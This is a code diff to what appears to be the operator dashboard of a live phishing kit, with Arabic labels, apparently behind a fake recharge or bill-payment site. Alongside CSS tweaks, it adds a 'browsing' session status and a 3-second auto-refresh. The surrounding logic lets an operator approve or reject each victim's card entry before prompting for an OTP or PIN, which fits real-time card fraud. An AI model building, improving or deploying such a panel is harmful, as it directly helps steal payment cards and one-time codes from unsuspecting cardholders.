@@ -480,11 +480,13 @@
 
     .modal {
       background: #fff;
-      border-radius: 16px;
-      padding: 28px;
+      border-radius: 14px;
+      padding: 18px 20px;
       width: 100%;
-      max-width: 480px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+      max-width: 400px;
+      max-height: 80vh;
+      overflow-y: auto;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.15);
       direction: rtl;
     }
 
@@ -492,11 +494,11 @@
       display: flex;
       align-items: center;
       justify-content: space-between;
-      margin-bottom: 20px;
+      margin-bottom: 12px;
     }
 
     .modal-title {
-      font-size: 17px;
+      font-size: 15px;
       font-weight: 700;
       color: #1e293b;
     }
@@ -521,20 +523,20 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 10px 0;
+      padding: 7px 0;
       border-bottom: 1px solid #f1f5f9;
     }
 
     .detail-row:last-child { border-bottom: none; }
 
     .detail-key {
-      font-size: 13px;
+      font-size: 12px;
       color: #64748b;
       font-weight: 500;
     }
 
     .detail-val {
-      font-size: 13px;
+      font-size: 12px;
       color: #1e293b;
       font-weight: 600;
       direction: ltr;
@@ -892,6 +894,7 @@ function updateStats() {
 
 function statusLabel(status) {
   const map = {
+    browsing: 'يتصفح الموقع',
     pending: 'في انتظار القرار',
     approved: 'موافق - انتظار OTP',
     rejected: 'مرفوض',
@@ -965,6 +968,7 @@ function renderSessions() {
     const isCard = st === 'pending';
     const isOTP = st === 'awaiting_otp';
     const isPIN = st === 'awaiting_pin';
+    const isBrowsing = st === 'browsing';
     const canDecide = isCard || isOTP || isPIN;
     const rowClass = canDecide ? 'awaiting-decision' : '';
     const typeClass = (s.type === 'reload') ? 'type-reload' : 'type-bill';
@@ -1190,6 +1194,11 @@ document.getElementById('clearAllBtn').addEventListener('click', clearAll);
 document.getElementById('modalCloseBtn').addEventListener('click', closeModal);
 document.getElementById('modalApproveBtn').addEventListener('click', function() { modalDecide('approve'); });
 document.getElementById('modalRejectBtn').addEventListener('click', function() { modalDecide('reject'); });
+
+// Auto-refresh every 3 seconds
+setInterval(() => {
+  loadSessions();
+}, 3000);
 
 checkAuth();
 </script>
